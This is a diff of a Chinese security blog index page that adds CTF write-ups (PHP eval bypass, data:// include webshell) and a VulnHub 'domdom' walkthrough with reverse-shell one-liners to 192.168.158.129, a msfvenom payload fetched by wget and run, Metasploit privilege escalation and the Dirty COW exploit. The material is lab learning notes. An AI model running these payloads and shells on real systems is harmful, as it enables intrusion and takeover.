@@ -188,6 +188,93 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/03/buu3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="not coder">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/06/03/buu3/" class="post-title-link" itemprop="url">buu3</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-06-03 17:06:21 / 修改时间：19:47:54" itemprop="dateCreated datePublished" datetime="2023-06-03T17:06:21+08:00">2023-06-03</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>131</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">fwrite(STDOUT,&#x27;[+]your function: &#x27;);</span><br><span class="line"></span><br><span class="line">$system=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">fwrite(STDOUT,&#x27;[+]your command: &#x27;);</span><br><span class="line"></span><br><span class="line">$command=str_replace(array(&quot;\r\n&quot;, &quot;\r&quot;, &quot;\n&quot;), &quot;&quot;, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">echo &#x27;[*] (~&#x27;.urlencode(~$system).&#x27;)(~&#x27;.urlencode(~$command).&#x27;);&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>修改为post传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert（eval($_POST[1])）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%8B%9A%8C%8B%DD%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+
+<p>，上蚁剑disable_function,插件</p>
+<p><img src="/2023/06/03/buu3/QQ%E6%88%AA%E5%9B%BE20230603194104.png"></p>
+<p>运行这个，</p>
+<p>在终端运行&#x2F;readflag即可</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/29/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -849,7 +936,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-29 12:37:37" itemprop="dateModified" datetime="2023-05-29T12:37:37+08:00">2023-05-29</time>
+                <time title="修改时间：2023-06-04 23:39:17" itemprop="dateModified" datetime="2023-06-04T23:39:17+08:00">2023-06-04</time>
               </span>
 
           <br>
@@ -858,14 +945,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
+              <span>7 分钟</span>
             </span>
 
         </div>
@@ -986,6 +1073,18 @@
 <p>账号 admin空格</p>
 <p> 密码随意；登录，他把所有字符都过滤了，那不穿就行了</p>
 <p>payload：index.php?c&#x3D;</p>
+<h1 id="单身杯"><a href="#单身杯" class="headerlink" title="单身杯"></a>单身杯</h1><h2 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>strrev，字符反转函数?&gt;，进行闭合，后面不影响</p>
+<p>伪协议读取，</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>学习两个新的命令</p>
+<p>sed</p>
+<p>awk</p>
 
       
     </div>
@@ -1019,7 +1118,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">练习1</a>
+            <a href="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">vulnhub练习1</a>
         </h2>
 
         <div class="post-meta">
@@ -1036,7 +1135,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-26 22:03:22" itemprop="dateModified" datetime="2023-05-26T22:03:22+08:00">2023-05-26</time>
+                <time title="修改时间：2023-06-05 21:15:18" itemprop="dateModified" datetime="2023-06-05T21:15:18+08:00">2023-06-05</time>
               </span>
 
           <br>
@@ -1045,14 +1144,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>650</span>
+              <span>995</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>4 分钟</span>
             </span>
 
         </div>
@@ -1105,7 +1204,7 @@
 <p>反弹shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor_reversetcp 192.168.158.129 3366</span><br></pre></td></tr></table></figure>
 
-<p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p>
+<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p>
 <p>命令将尝试查找具有root权限的SUID的文件。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
 
@@ -1135,7 +1234,82 @@
 
 <p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230517201832.png"></p>
 <p>get root</p>
-<h2 id="trollcave-v1-2"><a href="#trollcave-v1-2" class="headerlink" title="trollcave-v1-2"></a>trollcave-v1-2</h2>
+<h2 id="domdom"><a href="#domdom" class="headerlink" title="domdom"></a>domdom</h2><p>信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br></pre></td></tr></table></figure>
+
+<p>目标靶机 192.168.158.158</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.158.158 -Pn </span><br></pre></td></tr></table></figure>
+
+<p>dirsearch扫一下，发现</p>
+<p>index.php,admin.php</p>
+<p>在index.php 界面输入，抓包，发包发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello User, Please fill in the login credentials as well as your name for tracking purposes.</span><br></pre></td></tr></table></figure>
+
+<p>将请求头改为admin.php</p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605194544.png"></p>
+<p>传入参数cmd,进行命令执行，反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.158.129/5000 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>进行url编码发包无反应，网站是使用php,所以用php反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.158.129&quot;,5000);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>编码后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.158.129%22%2C5000%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h3><p>首先生成msf的木马</p>
+<p>kali执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.158.129 LPORT=7777 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>然后进入msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 7777</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>靶机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp;wget http://192.168.158.129/payload.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 payload.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+
+<p>连接成功，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search suggester</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202303.png"></p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202357.png"></p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202709.png"></p>
+<p>使用第一个，好像成功了，但后续失败了</p>
+<p>后续使用第二个，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/bpf_sign_extension_priv_esc</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204112.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/domom/Desktop/README.md</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204353.png"></p>
+<p>密码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mj7AGmPR-m&amp;Vf&gt;Ry&#123;&#125;LJRBS5nc+*V.#a</span><br></pre></td></tr></table></figure>
+
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>还是这台靶机，继续用，</p>
+<p>首先kali,下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/40616</span><br><span class="line">mv 40616 cowroot.c</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>靶机，进行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.158.129/cowroot.c</span><br><span class="line">gcc cowroot.c -o cowroot -pthread</span><br><span class="line">chmod +x cowroot</span><br><span class="line">./cowroot</span><br></pre></td></tr></table></figure>
+
+<p>过程中会报错，但不用管</p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605211415.png"></p>
+
       
     </div>
 
@@ -1494,92 +1668,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/14/nss1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/04/14/nss1/" class="post-title-link" itemprop="url">nss1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-04-14 21:19:45" itemprop="dateCreated datePublished" datetime="2023-04-14T21:19:45+08:00">2023-04-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-09 14:16:54" itemprop="dateModified" datetime="2023-05-09T14:16:54+08:00">2023-05-09</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>  部分nss的题</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/04/14/nss1/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1651,7 +1739,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-count">36</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1705,7 +1793,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:14</span>
 </div>
 
 <!--
